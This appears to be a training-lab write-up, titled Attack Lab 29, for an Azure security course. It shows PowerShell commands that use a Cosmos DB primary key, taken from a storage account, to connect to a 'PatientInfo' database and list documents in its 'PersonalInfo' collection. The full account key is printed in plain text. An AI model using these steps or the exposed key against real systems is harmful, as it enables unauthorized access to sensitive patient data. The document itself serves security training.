# Attack Lab 29
```
− Gain access to Cosmos DB instance using the primary key extracted fromphcbillinstorage storage account.
− Extract sensitive information.
```

```
url: 
primary_key:
Account: 
```

connection:

```
Import-Module C:\AzAppsec\Tools\CosmosDB\4.5.0\CosmosDB.psd1
PS C:\Users\studentuser107> $primary_key= ConvertTo-SecureString -String  "YBvekSUUBqvzpr7sqjfCaOLIIjhTw2haVzDoGWAbpMiG5S4nfNQ4xhxAok8Jl1pkGxNprKXv6bEiACDbrNAGFQ==" -AsPlainText -Force
PS C:\Users\studentuser107> $cosmosDBContext=New-CosmosDbContext -key $primary_key  -Database "PatientInfo"

cmdlet New-CosmosDbContext at command pipeline position 1
Supply values for the following parameters:
Account: backupdbsvc01
PS C:\Users\studentuser107> $cosmosDBContext


Account       : backupdbsvc01
Database      : PatientInfo
Key           : System.Security.SecureString
KeyType       : master
BaseUri       : https://backupdbsvc01.documents.azure.com/
Token         :
BackoffPolicy :
Environment   : AzureCloud
```

Extract Information:
```
 Get-CosmosDbDocument -Context $cosmosDBContext -CollectionId 'PersonalInfo' | FL


Id          : 08327598-d9b2-4296-8478-43b8a457e323
Etag        : 0000ae19-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggBAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggBAAAAAAAAAA==/
Attachments : attachments/

Id          : 01ebf2ee-abf1-4f0c-82ff-f41923a44265
Etag        : 0000af19-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggCAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggCAAAAAAAAAA==/
Attachments : attachments/

Id          : 0db45326-1e31-4517-b5bd-fb48016fcbf8
Etag        : 0000b019-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggDAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggDAAAAAAAAAA==/
Attachments : attachments/

Id          : c3b4c788-3d67-4bd5-a527-c3717dddc4b6
Etag        : d7020b37-0000-0100-0000-6492de670000
ResourceId  : NSwdAIupIggEAAAAAAAAAA==
Timestamp   : 6/21/2023 4:26:31 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggEAAAAAAAAAA==/
Attachments : attachments/

Id          : a58cc1aa-d811-4e55-9d2f-dded0c91262f
Etag        : 0000b219-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggFAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggFAAAAAAAAAA==/
Attachments : attachments/

Id          : b477cbd2-cfed-490a-9a46-1555ba8e8003
Etag        : 0000b319-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggGAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggGAAAAAAAAAA==/
Attachments : attachments/

Id          : 3a7d9fe2-c05c-4d4c-8284-0cd2d367414b
Etag        : 0000b419-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggHAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggHAAAAAAAAAA==/
Attachments : attachments/

Id          : 162c50bb-adf9-4a1b-86f2-5760bec10e96
Etag        : 0000b519-0000-0100-0000-62bdc50e0000
ResourceId  : NSwdAIupIggIAAAAAAAAAA==
Timestamp   : 6/30/2022 8:45:18 AM
Uri         : dbs/NSwdAA==/colls/NSwdAIupIgg=/docs/NSwdAIupIggIAAAAAAAAAA==/
Attachments : attachments/

```
